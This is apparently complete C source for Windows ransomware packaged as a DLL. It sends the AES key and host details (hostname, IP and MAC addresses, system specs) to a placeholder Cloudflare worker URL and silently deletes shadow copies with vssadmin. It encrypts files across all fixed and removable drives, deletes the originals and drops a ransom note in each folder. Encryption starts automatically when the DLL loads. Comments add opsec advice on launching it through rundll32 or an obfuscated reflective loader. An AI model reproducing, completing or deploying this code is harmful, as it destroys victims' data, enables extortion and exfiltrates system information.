#define UNICODE
#define _UNICODE
#include <windows.h>
#include <bcrypt.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <shlwapi.h>
#include <iphlpapi.h>
#include <shellapi.h>
#include <time.h>
#include <winhttp.h>
#include "xordecoder.h"

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

#define AES_KEY_SIZE 32
#define AES_BLOCK_SIZE 16
#define MAX_THREADS 500
#define MAX_WAIT_OBJECTS 64
#define XOR_KEY_SIZE 8
#define SESSION_ID_SIZE 16
#define BACKEND_URL "https://EVILCLOUDFLAREWORKER.workers.dev"
#define ACCESS_KEY "FRONTENDPASSWORD"  // Must match frontend password

/* ------------------------------------------------------------------ */
/* GLOBALS                                                            */
/* ------------------------------------------------------------------ */
typedef struct {
    wchar_t inPath[MAX_PATH];
    wchar_t outPath[MAX_PATH];
    BYTE key[AES_KEY_SIZE];
} ThreadData;

HANDLE threads[MAX_THREADS];
ThreadData threadData[MAX_THREADS];
char sessionId[SESSION_ID_SIZE + 1]; // +1 for null terminator
int threadCount = 0;
BYTE globalKey[AES_KEY_SIZE];
//unsigned char ransomnoteXorKey[] = { };
//unsigned char encodedRansomnote[] = { };
unsigned char ransomnoteXorKey[] = { 0x9b, 0x9d, 0x70, 0x7f, 0xa6, 0x62, 0x49, 0x70, 0xb8, 0x8b, 0x00, 0xb2, 0x69, 0xcd, 0xfc };
unsigned char encodedRansomnote[] = { 0xcb, 0xdc, 0x29, 0x5f, 0xef, 0x36, 0x69, 0x25, 0xe8, 0xa7, 0x20, 0xfa, 0x2c, 0x9f, 0xb9, 0xbb, 0xd4, 0x23, 0x5f, 0xeb, 0x3b, 0x69, 0x32, 0xec, 0xc8, 0x20, 0xf3, 0x2d, 0x89, 0xae, 0xde, 0xce, 0x23, 0x5e, 0xac, 0x31, 0x06, 0x34, 0xf6, 0xca, 0x4f, 0xf6, 0x26, 0x9e, 0xbd, 0xd5, 0xd9, 0x3f, 0x3e, 0xe8, 0x26, 0x43, 0x7a };

size_t encodedSize = sizeof(encodedRansomnote);
size_t keySize = sizeof(ransomnoteXorKey);
unsigned char *g_decryptedNote = decode_shellcode(encodedRansomnote, encodedSize, ransomnoteXorKey, keySize);

const wchar_t* protectedExtensions[] = {
    L"*.exe", L"*.dll", L"*.sys", L"*.msi", L"*.bat", L"*.cmd", L"*.com", L"*.scr",
    L"*.vbs", L"*.js", L"*.ps1", L"*.wsf", L"*.reg", L"*.msu", L"*.cab", L"*.inf",
    L"*.appx", L"*.msix", L"*.psm1", L"*.ocx", L"*.cpl", L"*.lnk", L"*README_U_HAVE_BEEN_RANSOMWARED.TXT", L"*.ENCRYPTED.PAYITUP"
};
const size_t protectedExtensionsCount = sizeof(protectedExtensions) / sizeof(protectedExtensions[0]);

/* ------------------------------------------------------------------ */
/* NEW FUNCTION: Collect Session Data                                 */
/* ------------------------------------------------------------------ */
char* CollectSessionData() {
    char* loot = (char*)malloc(16384);
    if (!loot) return NULL;
    loot[0] = '\0';
    size_t pos = 0;

    // Timestamp
    SYSTEMTIME st;
    GetLocalTime(&st);
    pos += snprintf(loot + pos, 16384 - pos, "Timestamp:%04d-%02d-%02d %02d:%02d:%02d|",
                    st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    // Hostname
    char hostname[256] = "Unknown";
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    pos += snprintf(loot + pos, 16384 - pos, "Hostname:%s|", hostname);

    // Internal IP
    char internalIP[256] = "Unknown";
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwSize = sizeof(adapterInfo);
    if (GetAdaptersInfo(adapterInfo, &dwSize) == ERROR_SUCCESS) {
        strcpy_s(internalIP, sizeof(internalIP), adapterInfo[0].IpAddressList.IpAddress.String);
    }
    pos += snprintf(loot + pos, 16384 - pos, "InternalIP:%s|", internalIP);

    // External IP
    char externalIP[64] = "Unknown";
    HINTERNET hInt = InternetOpenA("LootAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInt) {
        HINTERNET hUrl = InternetOpenUrlA(hInt, "http://ipinfo.io/ip", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hUrl) {
            char buf[64];
            DWORD read;
            if (InternetReadFile(hUrl, buf, sizeof(buf)-1, &read) && read > 0) {
                buf[read] = '\0';
                char* p = strstr(buf, "\r"); if (p) *p = '\0';
                p = strstr(buf, "\n"); if (p) *p = '\0';
                strcpy_s(externalIP, sizeof(externalIP), buf);
            }
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hInt);
    }
    pos += snprintf(loot + pos, 16384 - pos, "ExternalIP:%s|", externalIP);

    // MAC Addresses
    char macs[512] = "";
    PIP_ADAPTER_INFO pAdapter = adapterInfo;
    while (pAdapter && strlen(macs) < 400) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 pAdapter->Address[0], pAdapter->Address[1], pAdapter->Address[2],
                 pAdapter->Address[3], pAdapter->Address[4], pAdapter->Address[5]);
        strcat_s(macs, sizeof(macs), mac);
        strcat_s(macs, sizeof(macs), ",");
        pAdapter = pAdapter->Next;
    }
    if (strlen(macs) > 0) macs[strlen(macs)-1] = '\0';
    pos += snprintf(loot + pos, 16384 - pos, "MACs:%s|", macs);

    // CPU & RAM
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    MEMORYSTATUSEX mem = { sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    pos += snprintf(loot + pos, 16384 - pos, "Cores:%u|RAM:%.1fGB|",
                    sysInfo.dwNumberOfProcessors,
                    (double)mem.ullTotalPhys / (1024*1024*1024));

    // OS
    OSVERSIONINFOA osvi = { sizeof(osvi) };
    GetVersionExA(&osvi);
    pos += snprintf(loot + pos, 16384 - pos, "OS:Windows%u.%u|", osvi.dwMajorVersion, osvi.dwMinorVersion);

    return loot;
}

/* ------------------------------------------------------------------ */
/* SendSessionData with LOOT                                          */
/* ------------------------------------------------------------------ */
BOOL SendSessionData(const char* sessionId, const char* hexKey) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    BOOL bSuccess = FALSE;

    // ========== NEW: Collect session data ==========
    char* loot = CollectSessionData();
    if (!loot) return FALSE;

    char formData[8192];  // Increased buffer
    sprintf_s(formData, sizeof(formData),
              "loot=SessionID:%s|Key:%s|%s",
              sessionId, hexKey, loot);
    free(loot);

    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.133",
                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME,
                          WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return FALSE;

    URL_COMPONENTS urlComponents = {0};
    wchar_t szHostName[256] = {0};
    wchar_t szUrlPath[1024] = {0};

    urlComponents.dwStructSize = sizeof(URL_COMPONENTS);
    urlComponents.lpszHostName = szHostName;
    urlComponents.dwHostNameLength = _countof(szHostName);
    urlComponents.lpszUrlPath = szUrlPath;
    urlComponents.dwUrlPathLength = _countof(szUrlPath);

    wchar_t wszUrl[1024];
// MultiByte = ANSI/Utf-8 (unix), and WideChar or w_char, is UTF-16le (Windows text formatting)
    MultiByteToWideChar(CP_ACP, 0, BACKEND_URL, -1, wszUrl, _countof(wszUrl));

    if (!WinHttpCrackUrl(wszUrl, 0, 0, &urlComponents)) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    hConnect = WinHttpConnect(hSession, szHostName, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) goto cleanup;
// HTTPS stands for HTTP-over-TLS (SSL is deprecated for more than a decade)
    hRequest = WinHttpOpenRequest(hConnect, L"POST", szUrlPath,
                                  NULL, WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);
    if (!hRequest) goto cleanup;

    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/x-www-form-urlencoded",
                             -1L, WINHTTP_ADDREQ_FLAG_ADD);

    bResults = WinHttpSendRequest(hRequest,
                                  WINHTTP_NO_ADDITIONAL_HEADERS,
                                  0, (LPVOID)formData,
                                  (DWORD)strlen(formData),
                                  (DWORD)strlen(formData), 0);
    if (!bResults) goto cleanup;

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) goto cleanup;

    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
    if (dwStatusCode == 200) bSuccess = TRUE;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession)  WinHttpCloseHandle(hSession);
    return bSuccess;
}

/* ------------------------------------------------------------------ */
/* Rest of your original functions (unchanged, but fixed)             */
/* ------------------------------------------------------------------ */
void GenerateSessionId(char* sessionId, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    srand((unsigned int)time(NULL));
    for (size_t i = 0; i < length; i++) {
        int key = rand() % (sizeof(charset) - 1);
        sessionId[i] = charset[key];
    }
    sessionId[length] = '\0';
}

void BytesToHex(const BYTE* bytes, size_t len, char* hex) {
    for (size_t i = 0; i < len; i++) {
        sprintf_s(hex + (i * 2), 3, "%02X", bytes[i]);
    }
    hex[len * 2] = '\0';
}

BOOL IsProtectedExtension(const wchar_t* filePath) {
    for (size_t i = 0; i < protectedExtensionsCount; ++i) {
        if (PathMatchSpecW(filePath, protectedExtensions[i]))
            return TRUE;
    }
    return FALSE;
}

void DropNoteInDirectory(const wchar_t* directoryPath, const char* sessionId) {
    wchar_t notePath[MAX_PATH];
    swprintf_s(notePath, _countof(notePath), L"%s\\README_U_HAVE_BEEN_RANSOMWARED.TXT", directoryPath);

    FILE* f = NULL;
    if (_wfopen_s(&f, notePath, L"w") == 0 && f) {
        fwprintf(f, L"Your session ID for decryption is: %S\r\n", sessionId);
        if (g_decryptedNote)
            fwrite(g_decryptedNote, 1, wcslen((wchar_t*)g_decryptedNote) * sizeof(wchar_t), f);
        fclose(f);
    }
}

DWORD WINAPI DeleteShadowCopies(LPVOID lpParam) {
    ShellExecuteA(NULL, "open", "cmd.exe", "/c vssadmin delete shadows /all /quiet", NULL, SW_HIDE);
    return 0;
}

BOOL EncryptFileCustom(const wchar_t* inPath, const wchar_t* outPath, BYTE* key) {
    FILE* fIn = NULL;
    FILE* fOut = NULL;
    if (_wfopen_s(&fIn, inPath, L"rb") != 0 || !fIn) return FALSE;
    if (_wfopen_s(&fOut, outPath, L"wb") != 0 || !fOut) { fclose(fIn); return FALSE; }

    BYTE iv[AES_BLOCK_SIZE] = {0};
    fwrite(iv, 1, AES_BLOCK_SIZE, fOut);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD keyObjLen = 0, result = 0;
    PUCHAR keyObj = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) goto cleanup;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) goto cleanup;
    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjLen,
                          sizeof(DWORD), &result, 0)) goto cleanup;

    keyObj = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, keyObjLen);
    if (!keyObj) goto cleanup;

    if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj, keyObjLen, key, AES_KEY_SIZE, 0)) goto cleanup;

    BYTE buffer[1040], outBuffer[1040];
    DWORD bytesRead;
    while ((bytesRead = (DWORD)fread(buffer, 1, sizeof(buffer), fIn)) > 0) {
        DWORD bytesEncrypted = 0;
        if (BCryptEncrypt(hKey, buffer, bytesRead, NULL, iv, AES_BLOCK_SIZE,
                          outBuffer, sizeof(outBuffer), &bytesEncrypted, 0))
            goto cleanup;
        fwrite(outBuffer, 1, bytesEncrypted, fOut);
    }

    fclose(fIn); fclose(fOut);
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, keyObj);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;

cleanup:
    if (fIn) fclose(fIn);
    if (fOut) fclose(fOut);
    if (hKey) BCryptDestroyKey(hKey);
    if (keyObj) HeapFree(GetProcessHeap(), 0, keyObj);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return FALSE;
}

DWORD WINAPI EncryptFileThread(LPVOID lpParam) {
    ThreadData* data = (ThreadData*)lpParam;
    if (EncryptFileCustom(data->inPath, data->outPath, data->key)) {
        DeleteFileW(data->inPath);  // Fixed: now runs
    }
    return 0;
}

void RecurseDirectory(const wchar_t* basePath) {
    wchar_t searchPath[MAX_PATH];
    WIN32_FIND_DATAW findData;
    HANDLE hFind;

    swprintf_s(searchPath, _countof(searchPath), L"%s\\*.*", basePath);
    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
            continue;

        wchar_t fullPath[MAX_PATH];
        swprintf_s(fullPath, _countof(fullPath), L"%s\\%s", basePath, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            RecurseDirectory(fullPath);
        } else {
            if (IsProtectedExtension(fullPath)) continue;

            wchar_t outPath[MAX_PATH];
            swprintf_s(outPath, _countof(outPath),
                       L"%s.ENCRYPTED.PAYITUP", fullPath);

            if (threadCount < MAX_THREADS) {
                ThreadData* td = &threadData[threadCount++];
                wcsncpy_s(td->inPath, _countof(td->inPath), fullPath, _TRUNCATE);
                wcsncpy_s(td->outPath, _countof(td->outPath), outPath, _TRUNCATE);
                memcpy(td->key, globalKey, AES_KEY_SIZE);
                threads[threadCount - 1] = CreateThread(NULL, 0, EncryptFileThread, td, 0, NULL);
            }
        }

        DropNoteInDirectory(basePath, sessionId);  // Fixed: called every folder

    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
}

void ScanDrives() {
    for (wchar_t drive = L'C'; drive <= L'Z'; ++drive) {
        wchar_t rootPath[4] = { drive, L':', L'\\', L'\0' };
        UINT type = GetDriveTypeW(rootPath);
        if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE)
            RecurseDirectory(rootPath);
    }
}
DWORD WINAPI RunEncryption(LPVOID lpParam) {
    GenerateSessionId(sessionId, SESSION_ID_SIZE);

    if (BCryptGenRandom(NULL, globalKey, AES_KEY_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0)
        return 1;

    char hexKey[AES_KEY_SIZE * 2 + 1];
    BytesToHex(globalKey, AES_KEY_SIZE, hexKey);

    // Attempt to send session data - no fallback to disk storage
    SendSessionData(sessionId, hexKey);

    HANDLE hShadowThread = CreateThread(NULL, 0, DeleteShadowCopies, NULL, 0, NULL);
    ScanDrives();

    for (int i = 0; i < threadCount; i += MAX_WAIT_OBJECTS) {
        int chunk = min(MAX_WAIT_OBJECTS, threadCount - i);
        WaitForMultipleObjects(chunk, &threads[i], TRUE, INFINITE);
    }

    if (hShadowThread) {
        WaitForSingleObject(hShadowThread, INFINITE);
        CloseHandle(hShadowThread);
    }
    return 0;
}
/*
Opsec wise, DLL ransomware is probably not the best thing because someone can impersonate you if the DLL is not obfuscated.
However, you can use it as a lolbin attack, by executing a exported function through rundll32.exe -f function dll.dll
Instead of ever using the dll on its own. You can also use sRDI by monaxgas (ShellcodeReflectiveDLL Injection), and run it in a obfuscated loader
*/
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, RunEncryption, NULL, 0, NULL);
    }
    return TRUE;
}
